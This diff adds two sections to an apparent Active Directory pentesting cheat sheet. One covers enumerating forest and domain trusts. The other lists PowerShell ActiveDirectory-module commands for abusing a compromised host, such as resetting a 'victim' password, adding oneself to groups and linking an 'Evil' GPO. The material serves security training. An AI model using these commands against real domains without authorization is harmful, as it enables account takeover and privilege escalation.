@@ -13,6 +13,43 @@ AD is a graph of objects (users, groups, computers) and permissions. Pentesting 
 !!! abstract "TL;DR"
     Get a foothold credential → collect BloodHound → find the shortest path (ACL abuse, Kerberos, delegation, GPO) → walk it to DCSync → Golden Ticket for persistence.
 
+## :material-file-tree: Forests, domains & trusts
+
+Before you attack a path, know which **boundary** you are crossing. A domain is
+an administrative unit; a **forest** is the security boundary. Domains inside one
+forest trust each other automatically and transitively — domains in *different*
+forests only trust each other if someone explicitly set it up.
+
+![Active Directory forests and domains](../assets/ad/forests-domains-trusts.png)
+
+*Two forests, each with child domains. Trusts inside a forest are automatic and
+transitive; between forests they are explicit.*
+
+The consequence that matters on an engagement: a user in one forest is **not**
+automatically able to authenticate to machines in another, even where a
+bidirectional trust exists between the two top-level domains. Reaching a
+grandchild domain across a forest boundary usually needs its own direct trust —
+so when a BloodHound path looks like it crosses forests, verify the trust exists
+before you build a plan on it.
+
+```powershell
+# What trusts does this domain have, and which way do they point?
+Get-DomainTrust                    # PowerView
+nltest /domain_trusts /all_trusts
+Get-ADTrust -Filter *              # RSAT
+```
+
+```bash
+# From Linux
+bloodhound-python -d target.local -u user -p pass -c All --zip   # collects trusts too
+ldapsearch -x -H ldap://dc -b "CN=System,DC=target,DC=local" "(objectClass=trustedDomain)"
+```
+
+!!! loot "Trust direction is backwards from intuition"
+    If domain A **trusts** domain B, then B's users can be granted access to A's
+    resources — the arrow of trust points the opposite way to the arrow of
+    access. Read every trust twice before deciding which side is the target.
+
 ## :material-map: Map the domain with BloodHound
 
 ```bash
@@ -118,6 +155,42 @@ nxc smb DC01 -u bob -p Pass --ntds                          # via NetExec
 
 !!! opsec "Everything above is monitored by mature SOCs"
     DCSync (4662), ticket anomalies (4769), ADCS misuse, and mass ACL changes are prime hunting ground for Defender for Identity / good detections. Time your actions and document them for the report.
+
+## :material-powershell: ActiveDirectory PowerShell module (RSAT)
+
+When you land on a domain-joined Windows host, the `ActiveDirectory` module is a first-class enum/abuse tool that lives off the land — no dropping binaries.
+
+```powershell
+Get-Module ; Import-Module ActiveDirectory        # load it
+Get-Command -Module ActiveDirectory                # what's available
+Get-Help New-ADUser                                # syntax for any cmd-let
+```
+
+```powershell
+# --- Users ---
+Get-ADUser -Identity amasters -Properties *                        # dump one user
+New-ADUser -Name "first last" -AccountPassword (Read-Host -AsSecureString) -Enabled $true
+Set-ADAccountPassword -Identity victim -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "NewP@ss!" -Force)
+Set-ADUser -Identity victim -ChangePasswordAtLogon $true           # force reset at next logon
+Unlock-ADAccount -Identity victim
+Remove-ADUser -Identity victim
+
+# --- Groups / OUs (privesc when you hold the rights) ---
+Add-ADGroupMember -Identity "Helpdesk" -Members bob               # add yourself to a group
+New-ADGroup -Name "analysts" -GroupScope Global -GroupCategory Security -Path "CN=Users,DC=corp,DC=local"
+New-ADOrganizationalUnit -Name "IT" -Path "DC=corp,DC=local"
+
+# --- Computers ---
+Get-ADComputer -Identity DC01 -Properties * | select CN,CanonicalName,IPv4Address
+Add-Computer -DomainName corp.local -Credential corp\bob_adm -Restart   # domain-join a host
+
+# --- GPO (link an existing GPO to an OU) ---
+Copy-GPO -SourceName "Baseline" -TargetName "Evil"
+New-GPLink -Name "Evil" -Target "OU=Employees,DC=corp,DC=local" -LinkEnabled Yes
+```
+
+!!! tip "Enumerate first, no module needed"
+    On a locked-down host without RSAT, the same queries work through `.NET` / ADSI or `Get-ADObject -LDAPFilter` — and remotely through [BloodHound](bloodhound.md) / `nxc ldap`. Reach for these cmd-lets when you already have a shell and want to *modify* objects (password resets, group adds, GPO links) after BloodHound shows you the path.
 
 ## :material-link-variant: Related
 
